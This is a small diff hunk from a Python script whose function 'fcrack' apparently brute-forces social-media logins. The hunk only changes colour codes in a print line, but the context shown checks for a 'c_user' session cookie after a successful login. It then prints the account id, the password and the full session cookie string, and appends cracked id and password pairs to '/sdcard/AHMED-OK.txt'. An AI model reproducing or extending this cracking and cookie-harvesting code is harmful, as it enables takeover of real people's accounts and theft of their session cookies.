@@ -1495,7 +1495,7 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[AHMED-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[1;97m')
+                print('\033[1;32m[AHMED-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;93m COOKIE = \033[1;37m'+coki+  '  ''  \033[1;37m')
                 open('/sdcard/AHMED-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
